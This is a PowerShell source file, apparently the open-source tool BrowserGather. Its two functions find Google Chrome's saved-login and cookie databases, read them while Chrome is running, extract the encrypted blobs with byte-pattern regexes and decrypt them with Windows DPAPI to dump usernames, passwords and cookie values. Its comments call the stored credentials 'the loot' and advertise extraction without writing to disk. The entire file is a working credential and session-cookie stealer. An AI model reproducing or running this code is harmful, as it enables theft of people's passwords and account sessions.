# Instructions:
# Import-Module .\Downloads\BrowserGather.ps1
# Get-Help Get-ChromeCreds   or   Get-Help Get-ChromeCookies

function Get-ChromeCreds {

    <#
        Author  :  sekirkity
        Github  :  https://github.com/sekirkity
        
        rewritten by
        Author  :  TheRealNoob
        Github  :  https://github.com/TheRealNoob
    #>

    <#
    .SYNOPSIS
    Searches Google Chrome databases for saved Usernames & Passwords
    .DESCRIPTION
    Extracts Chrome credentials from local databases without writing to disk
    .PARAMETER OutputAsObject
    The default output format is a text/array dump to host.
    This changes the format to storing all Chrome profiles under a single object.  Recommended to save output to a variable.  This is preferable if you plan to do data manipulation.
    Format will look like:

    $Object = [PSCustomObject]@{
        Default = @(
            URL_Username = @()
            Password = @()
        )
        Profile1 = @(
            URL_Username = @()
            Password = @()
        )
        SystemProfile = @(
            URL_Username = @()
            Password = @()
        )
    }

    .EXAMPLE
    Get-ChromeCreds
    .EXAMPLE
    $Variable1 = Get-ChromeCreds -OutputAsObject
    .OUTPUTS
    Default output is a text/array dump to host.  Nice and easy if you want to quickly get info.

    The -OutputAsObject switch changes output format.  See Parameter help section for more info.
    .NOTES
    Help file:
    Get-Help Get-ChromeCreds
    .LINK
    http://sekirkity.com/browsergather-part-1-fileless-chrome-credential-extraction-with-powershell/
    https://github.com/sekirkity/BrowserGather
    #>

    [CmdletBinding()]
    param(
        [Switch]$OutputAsObject
    )

    Add-Type -AssemblyName System.Security # Necessary to perform password decryption
    $OutputObject = [PSCustomObject]@{}
    

    # ******************************
    #
    # Find "Login Data" databases.  This is where the loot is stored.
    #
    # ******************************

    If (Test-Path "$env:localappdata\Google\Chrome\User Data") {
        $LoginDataFiles = (Get-ChildItem -Path "$env:localappdata\Google\Chrome\User Data" -Filter "Login Data" -File -Recurse -Force).FullName
    } else {
        Throw "Chrome database file(s) not found"
    }
    
    If (!(Get-Variable "LoginDataFiles" -ErrorAction SilentlyContinue)) {
        Throw "Chrome database file(s) not found"
    }

    Foreach ($LoginDataPath in $LoginDataFiles) {
        
        $ProfileNameFlattened = ([System.IO.directoryinfo] "$LoginDataPath").Parent.Name.Replace(' ','')
        Write-Verbose "Opening DB file for Profile: $ProfileNameFlattened"

        # ******************************
        #
        # Read from DB file in Read-Only mode
        # This gets around the file lock, allowing us to run without closing Chrome.
        #
        # ******************************
        
	    ## Credit to Matt Graber for his technique on using regular expressions to search for binary data
	    $Stream = New-Object IO.FileStream -ArgumentList "$LoginDataPath", 'Open', 'Read', 'ReadWrite'
	    $Encoding = [system.Text.Encoding]::GetEncoding(28591)
	    $StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	    $LoginDataContent = $StreamReader.ReadToEnd()
	    $StreamReader.Close()
	    $Stream.Close()
        
        # ******************************
        #
        # Find and decrypt password fields
        #
        # ******************************
        
	    ## First the magic bytes for the password. Ends using the "http" for the next entry.
	    $PwdRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)'
	    $PwdListEncrypted = $PwdRegex.Matches($LoginDataContent)
	    $PwdListDecrypted = @()

	    ## Decrypt the password matches and put them in an array
	    Foreach ($Password in $PwdListEncrypted) {
		    $Password = $Encoding.GetBytes($Password)
		    $PwdDecryptedByteArray = [System.Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		    $PwdListDecrypted += [System.Text.Encoding]::Default.GetString($PwdDecryptedByteArray)
	    }
        
        # ******************************
        #
        # Find and URL/Username fields
        # In the DB - URL & Username are stored in separate fields and can be queried that way,
        # but due to the simplicity of the field values and the fact that we're using regex it is not possible to seperate them.
        #
        # ******************************

	    ## Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
	    $UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]{2}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
	    $UserList = ($UserRegex.Matches($LoginDataContent)).Value
        
        ## Check to see if number of users matches the number of passwords. If the values are different, very likely that there was a regex mismatch.
	    ## All returned values should be treated with caution if this error is presented. May be out of order.
	    If ($UserList.Count -ne $PwdListDecrypted.Count) { 
	        Write-Warning -Message "Found a different number of usernames and passwords! This is likely due to a regex mismatch.  You may find that your usernames/passwords do not fit together perfectly."
        }
        

        # ******************************
        #
        #  Format and output everything
        #
        # ******************************
        
        ## Redundancy to figure out what to do in the case of a mismatch
        If ($UserList.count -ne $PwdListDecrypted.Count) {
            If ($UserList.Count -gt -$PwdListDecrypted.Count) {
                $Higher = [int]$UserList.count
            } else {
                $Higher = [int]$PwdListDecrypted.Count
            }
        } else {
            $Higher = [int]$UserList.count # Pick one since it doesn't matter
        }
        
        ## Array stores Username/Password of current Profile
        $OutputArray = @()
        For ($i = 0; $i -le $Higher; $i++) {
            $object = [PSCustomObject]@{}
            $object | Add-Member -MemberType NoteProperty -Name 'URL_Username' -Value $UserList[$i]
            $object | Add-Member -MemberType NoteProperty -Name 'Password' -Value $PwdListDecrypted[$i]
            $OutputArray += $object
        }

        If ($OutputAsObject) {
            $OutputObject | Add-Member -MemberType NoteProperty -Name "$ProfileNameFlattened" -Value $OutputArray
        } else {        
            Write-Output "Profile found: $ProfileNameFlattened`n"
            Write-output $OutputArray | Format-List
        }
    }
    
    If ($OutputAsObject) {
        Write-Output $OutputObject
    }
}

# Chrome Cookie Extraction
# Use: Get-ChromeCookies [path to Cookies]
# Path is optional, use if automatic search doesn't work

function Get-ChromeCookies() {
	Param(
		[String]$Path
	)

	if ([String]::IsNullOrEmpty($Path)) {
		$Path = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
	}

	if (![system.io.file]::Exists($Path))
	{
		Write-Error 'Chrome db file doesnt exist, or invalid file path specified.'
		Break
	}
	Add-Type -AssemblyName System.Security
	# Credit to Matt Graber for his technique on using regular expressions to search for binary data
	$Stream = New-Object IO.FileStream -ArgumentList $Path, 'Open', 'Read', 'ReadWrite'
	$Encoding = [system.Text.Encoding]::GetEncoding(28591)
	$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
	$BinaryText = $StreamReader.ReadToEnd()
	$StreamReader.Close()
	$Stream.Close()

	# Regex for the encrypted blob. Starting bytes were easy, but the terminating bytes were tricky. Four different scenarios are covered.
	$BlobRegex = [Regex] '(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=[\s\S]{2}\x97[\s\S]{8}\x00[\s\S]{2}\x0D|\x0D[\s\S]{2}\x00[\s\S]{3}\x00\x02|\x00{20}|\Z)'
	$BlobMatches = $BlobRegex.Matches($BinaryText)
	$BlobNum = 0
	$DecBlobArray = @()
	$BlobMatchCount = $BlobMatches.Count

	# Attempt to decrypt the blob. If it fails, a null byte is added to the end.
	# If it fails again, most likely due to non-contiguous storage. The blob value will be changed.
	# Then puts results into an array.
	
	Foreach ($Blob in $BlobMatches) {
		$Blob = $Encoding.GetBytes($BlobMatches[$BlobNum])
		try {
			$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
		}
		catch { 
			$Blob = $Blob + " 0"
			try { 
				$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Blob,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
			}
			catch { 
				$Decrypt = [string]"Unable to decrypt blob"
				$DecBlob = [string]"Unable to decrypt blob"
				$Error = [string]"Unable to decrypt blob. The value of the cookie will be changed to (Unable to decrypt blob)."
				Write-Error $Error
			}	
		}
		$DecBlob = [System.Text.Encoding]::Default.GetString($Decrypt)
		$DecBlobArray += $DecBlob
		$BlobNum += 1
	}

	# Regex for cookie hostname, name, and path, in that order. Inital magic bytes were very tricky. Reads until a null byte value is found.
	
	$CookieRegex = [Regex] '(?<=\x97[\s\S]{8}\x00[\s\S]{2}\x0D[\s\S]{11,12})[\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2d\x21\x20\x22\x20\x23\x20\x24\x20\x25\x20\x26\x20\x27\x20\x28\x20\x29\x20\x2a\x20\x2b\x2d\x20\x2e\x20\x2f\x3a\x3c\x20\x3d\x20\x3e\x20\x3f\x20\x40\x5b\x20\x5c\x20\x5d\x20\x5e\x20\x5f\x20\x60\x7b\x20\x7c\x20\x7d\x20\x7e\x2c]{3,}?(?=[\x00\x01\x02\x03])'
	$CookieMatches = $CookieRegex.Matches($BinaryText)
	$CookieMatchCount = $CookieMatches.Count

	# Check to see if number of cookies matches the number of encrypted blobs. If the values are different, very likely that there was a regex mismatch.
	# All returned values should be treated with caution if this error is presented. May be out of order.
	
	if (-NOT ($CookieMatchCount -eq $BlobMatchCount)) { 
		$Mismatch = [string]"The number of cookies is different than the number of encrypted blobs! This is most likely due to a regex mismatch."
		Write-Error $Mismatch
	}

	# Put cookies into an array.
	
	$CookieNum = 0
	$CookieArray = @()
	Foreach ($Cookie in $CookieMatches) {
		$Cookie = $Encoding.GetBytes($CookieMatches[$CookieNum])
		$CookieString = [System.Text.Encoding]::Default.GetString($Cookie)
		$CookieArray += $CookieString
		$CookieNum += 1
	}

	# Now create an object to store the previously created arrays.
	
	$ArrayFinal = New-Object -TypeName System.Collections.ArrayList
	for ($i = 0; $i -lt $CookieNum; $i++) {
		$ObjectProp = @{
			Blob = $DecBlobArray[$i]
			Cookie = $CookieArray[$i]
		}
	
		$obj = New-Object PSObject -Property $ObjectProp
		$ArrayFinal.Add($obj) | Out-Null
	}
	$ArrayFinal
}
